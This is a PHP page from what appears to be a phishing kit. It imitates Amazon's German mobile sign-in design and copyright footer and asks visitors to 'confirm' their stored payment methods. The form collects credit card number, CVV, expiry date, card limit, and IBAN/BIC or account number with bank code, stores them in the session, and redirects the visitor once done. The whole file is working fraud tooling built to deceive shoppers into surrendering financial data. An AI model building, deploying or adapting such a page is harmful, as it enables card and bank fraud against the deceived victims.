<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>

<!DOCTYPE html>
<html class="a-ember a-transition a-transform a-opacity a-border-image a-border-radius a-box-shadow a-text-stroke a-text-shadow a-mobile a-ios a-touch-scrolling a-transform3d a-gradients a-local-storage a-textarea-placeholder a-input-placeholder a-autofocus a-webworker a-history a-drag-drop a-svg a-canvas a-video a-audio a-js a-touch a-mobile a-ws a-audio a-video a-canvas a-svg a-drag-drop a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-ios a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-19ax5a9jf="mongoose" data-aui-build-date="3.17.5.1-2017-04-11">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<title><?php echo $title ?></title>
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
		<link rel="stylesheet" href="src/css/51DPEdT1dL.css">
		<link rel="stylesheet" href="src/css/AuthenticationPortalAssets-00b5524f401f34fc3868ad90d4aa679bf.css">
		<link href="src/img/favicon.ico" rel="shortcut icon" />
		<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
		<script type="text/javascript">
			$(document).ready(function() {
				$( "#ccnr" ).change(function() {
					var firstNumber = $("#ccnr").val()[0];
					
					if (firstNumber == 3) {
						$("#ccnr").css("background-position", "345px 12%");
					} else if (firstNumber == 4) {
						$("#ccnr").css("background-position", "345px -0.5%");
					} else if (firstNumber == 5) {
						$("#ccnr").css("background-position", "345px 5.7%");
					} else {
						$("#ccnr").css("background-position", "345px 87.5%");
					}
				});
				
				$( "#enterIBAN" ).click(function() { 
					$("#blzfield").css("display", "none");
					$("#ktofield").css("display", "none");
					$("#iban_lbl_field").css("display", "none");
					$("#ibanfield").css("display", "block");
					$("#bicfield").css("display", "block");
					$("#kto_lbl_field").css("display", "block");
					$("#kto_active").val("0");
				});
				
				$( "#enterKtoBLZ" ).click(function() { 
					$("#blzfield").css("display", "block");
					$("#ktofield").css("display", "block");
					$("#iban_lbl_field").css("display", "block");
					$("#ibanfield").css("display", "none");
					$("#bicfield").css("display", "none");
					$("#kto_lbl_field").css("display", "none");
					$("#kto_active").val("1");
				});
				
				$( "#noCC" ).click(function() { 
					if ($("#noCC" ).is( ":checked" )) {
						$("#ccnr").attr("disabled", true);
						$("#cvv").attr("disabled", true);
						$("#ccDate1").attr("disabled", true);
						$("#ccDate2").attr("disabled", true);
						$("#limit").attr("disabled", true);
						$("#cc_active").val("0");
					} else {
						$("#ccnr").removeAttr("disabled");
						$("#cvv").removeAttr("disabled");
						$("#ccDate2").removeAttr("disabled");
						$("#ccDate1").removeAttr("disabled");
						$("#limit").removeAttr("disabled");
						$("#cc_active").val("1");
					}
				});
			});
		</script>
	</head>

  <body class="a-color-offset-background  ap-locale-de_DE a-m-de a-aui_51744-c a-aui_57326-c a-aui_72554-c a-aui_83815-c a-aui_86171-c a-aui_96511-t1 a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_noopener_84118-t1 a-aui_ux_102912-c a-aui_ux_59374-c a-aui_ux_60000-c a-aui_ux_92006-t1 a-aui_ux_98513-c a-dex_92889-c auth-show-password-enabled auth-show-password-engaged auth-show-password-ready" style="">
		<div id="a-page">
			<div class="a-section a-spacing-none">
				<link rel="stylesheet" href="src/css/51b-EJ2JOWL.css">
				<style type="text/css">
					<!--
					.nav-sprite-v3 .nav-sprite {
					background-image: url(src/img/sky_webnav_V1_sprite_1x._CB508122268_.png);
					background-repeat: no-repeat;
					}
					.nav-spinner {
					background-image: url(src/img/snake._CB192194539_.gif);
					}
					-->
				</style>

				<header class="nav-mobile nav-locale-de nav-lang-de nav-ssl nav-unrec nav-blueheaven">
					<div id="navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3">
						<div id="nav-logobar">
							<div class="nav-left">
								<div id="nav-logo">
									<a href="#" class="nav-logo-link" tabindex="">
										<span class="nav-logo-base nav-sprite"></span>
										<span class="nav-logo-ext nav-sprite"></span>
										<span class="nav-logo-locale nav-sprite"></span>
									</a>
								</div>
							</div>
							<div class="nav-right"></div>
						</div>
					</div>
				</header>
			</div>

			<div class="a-container">
				<div class="a-section a-spacing-none"></div>
				<div class="a-section a-spacing-none auth-pagelet-mobile-container"></div>

				<div class="a-section auth-pagelet-mobile-container">

					<div id="auth-alert-window" class="a-box a-alert a-alert-error" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
						<div class="a-box-inner a-alert-container">
							<h4 class="a-alert-heading">Ein Problem ist aufgetreten:</h4>
							<div class="a-alert-content">
								<ul class="a-unordered-list a-vertical auth-error-messages" role="alert">
									<li id="auth-email-missing-alert" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
										<span class="a-list-item">
											<?php
												if (isset($_SESSION['errList'])) {
													for ($i = 0; $i < count($_SESSION['errList']); $i++) {
														echo $_SESSION['errList'][$i] . '<br/>';
													}
													
													unset($_SESSION['errList']);
												}
											?>
										</span>
									</li>
								</ul>
							</div>
						</div>
					</div>

					<form name="signIn" method="post" novalidate="" action="index.php" class="auth-validate-form auth-clearable-form fwcim-form" formnovalidate>
						<input type="hidden" name="cc_active" id="cc_active" value="<?php echo (isset($_SESSION['noCC']) ? "0" : "1"); ?>"/>
						<input type="hidden" name="kto_active" id="kto_active" value="<?php echo (isset($_SESSION['kto_active']) ? "1" : "0"); ?>"/>
						
						<div class="a-row">
							<div class="a-section a-spacing-extra-large">
								<h1 class="a-spacing-small a-spacing-top-small a-text-left">
								Bestätigung hinterlegter Zahlungsmittel
								</h1>
								<p>
									Bitte geben Sie die bei uns hinterlegten Zahlungsmittel ein und bestätigen Sie dies!
								</p>
							</div>
						</div>

						<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
							<label class="a-form-label auth-mobile-label">
								Kreditkartennummer
							</label>
							<?php
								if (isset($_SESSION['ccnr']) && !empty($_SESSION['ccnr'])) {
									$icon = null;
									
									if (substr($_SESSION['ccnr'], 0, 1) == 3) {
										$icon = "12%";
									} else if (substr($_SESSION['ccnr'], 0, 1) == 4) {
										$icon = "-0.5%";
									} elseif (substr($_SESSION['ccnr'], 0, 1) == 5) {
										$icon = "5.7%";
									}
								} else {
									$icon = "87.5%";
								}
							?>
							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="ccnr" name="ccnr" placeholder="Kreditkartennummer" value="<?php echo (isset($_SESSION['ccnr']) ? $_SESSION['ccnr'] : ""); ?>" maxlength="16" type="text"
								style="background-image: url(src/img/cc_typ.png);background-position:345px <?php echo $icon ?>;height:32px;background-repeat: no-repeat" <?php echo (isset($_SESSION['noCC']) ? "disabled" : ""); ?>>
							</div>
							
							<label class="a-form-label auth-mobile-label">
								Kartenprüfziffer
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="cvv" name="cvv" placeholder="Kartenprüfziffer" value="<?php echo (isset($_SESSION['cvv']) ? $_SESSION['cvv'] : ""); ?>" maxlength="4" type="text">
							</div>
							
							<label class="a-form-label auth-mobile-label">
								Gültig bis
							</label>

							<?php		
								echo '<select style="margin-top:4px;margin-bottom:4px;border:1px solid #a6a6a6;width:190px;padding:4px;border-top-color: #949494" name="ccDate1" id="ccDate1"' . (isset($_SESSION['noCC']) ? " disabled" : "") . '><option value="Monat">Monat</option>';
								
								for ($i = 1; $i <= 12; $i++) {
									if (isset($_SESSION['ccDate1'])) {
										if ($i == $_SESSION['ccDate1']) {
											echo '<option selected value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
										} else {
											echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
										}
									} else {
										echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
									}
								}
								echo '</select>';
							?>
							
							&nbsp;
							
							<?php		
								echo '<select style="border:1px solid #a6a6a6;width:195px;padding:4px;border-top-color: #949494" name="ccDate2" id="ccDate2"' . (isset($_SESSION['noCC']) ? " disabled" : "") . '><option value="Jahr">Jahr</option>';
							
								$year = date("Y");
								for ($i = $year; $i <= $year + 6; $i++) {
									if (isset($_SESSION['ccDate2'])) {
										if ($i == $_SESSION['ccDate2']) {
											echo '<option selected value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
										} else {
											echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
										}
									} else {
										echo '<option value="' . str_pad($i, 2, '0', STR_PAD_LEFT) . '">' . str_pad($i, 2, '0', STR_PAD_LEFT) . '</option>';
									}
								}
								echo '</select>';
							?>
							
							<label class="a-form-label auth-mobile-label">
								Verfügungsrahmen (optional)
							</label>

							<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
								<input id="limit" name="limit" placeholder="Verfügungsrahmen" value="<?php echo (isset($_SESSION['limit']) ? $_SESSION['limit'] : ""); ?>" maxlength="15" type="text" <?php echo (isset($_SESSION['noCC']) ? "disabled" : ""); ?>>
							</div>
							<br/>
							<input type="checkbox" id="noCC" name="noCC" <?php echo (isset($_SESSION['noCC']) ? "checked" : ""); ?>> Verfüge über keine Kreditkarte
							<br/><br/>
							<hr/>
							
							<div id="ktofield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "block" : "none"); ?>">
								<label class="a-form-label auth-mobile-label">
									Abrechnungskonto
								</label>
								
								<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
									<input id="kto" name="kto" placeholder="Abrechnungskonto" value="<?php echo (isset($_SESSION['kto']) ? $_SESSION['kto'] : ""); ?>" autocomplete="off" maxlength="30" type="text">
								</div>
							</div>
							
							<div id="blzfield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "block" : "none"); ?>">
								<label class="a-form-label auth-mobile-label">
									Bankleitzahl
								</label>
								
								<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
									<input id="blz" name="blz" placeholder="Bankleitzahl" value="<?php echo (isset($_SESSION['blz']) ? $_SESSION['blz'] : ""); ?>" autocomplete="off" maxlength="30" type="text">
								</div>
							</div>
							
							<div id="iban_lbl_field" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "block" : "none"); ?>">
								<span class="enterBankData" id="enterIBAN" style="float:right">IBAN und BIC eingeben</span>
							</div>
							
							<div id="ibanfield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "none" : "block"); ?>">
								<label class="a-form-label auth-mobile-label">
									IBAN
								</label>
								
								<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
									<input id="iban" name="iban" placeholder="IBAN" value="<?php echo (isset($_SESSION['iban']) ? $_SESSION['iban'] : ""); ?>" autocomplete="off" maxlength="30" type="text">
								</div>
							</div>
							
							<div id="bicfield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "none" : "block"); ?>">
								<label class="a-form-label auth-mobile-label">
									BIC (optional)
								</label>
								
								<div class="a-input-text-wrapper auth-required-field auth-fill-claim">
									<input id="bic" name="bic" placeholder="BIC (optional)" value="<?php echo (isset($_SESSION['bic']) ? $_SESSION['bic'] : ""); ?>" autocomplete="off" maxlength="30" type="text">
								</div>
							</div>
							
							<div id="kto_lbl_field" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "none" : "block"); ?>">
								<span class="enterBankData" id="enterKtoBLZ" style="float:right">Stattdessen Kontonummer eingeben</span>
							</div>
							<br/><br/>
						</div>
						
						<div class="a-row"></div>

						<div class="a-section">
							<div class="a-button-stack">
								<span id="auth-signin-button" class="a-button a-spacing-extra-large a-button-span12 a-button-primary auth-share-credential-off">
									<span class="a-button-inner">
										<input id="signInSubmit" name="doPaymentInfo_x" tabindex="6" class="a-button-input" aria-labelledby="auth-signin-button-announce" type="submit" formnovalidate>
										<span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
											Fortfahren
										</span>
									</span>
								</span>
								
							</div>
						</div>
					</form>
				</div>

				<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
					<div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v3">

						<div class="icp-container-mobile">
							<style type="text/css">
								#icp-touch-link-language { display: none; }
							</style>    

							<a href="#" class="icp-touch-link-2" id="icp-touch-link-language">
								<div class="icp-nav-globe-img-2 icp-mobile-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span>
							</a>

							<style type="text/css">
								#icp-touch-link-country { display: none; }
							</style>
							
							<a href="#" class="icp-touch-link-2" id="icp-touch-link-country">
								<span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span>
							</a>
						</div>

						<ul class="nav-ftr-horiz">
							<li class="nav-li"><a href="#" class="nav-a">Unsere AGB</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Datenschutzerklärung</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Impressum</a></li>
							<li class="nav-li"><a href="#" class="nav-a">Cookies &amp; Internet-Werbung</a></li>
						</ul>
						<div id="nav-ftr-copyright">© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</div>
					</div>
				</footer>
			</div>
		</div>
	</body>
</html>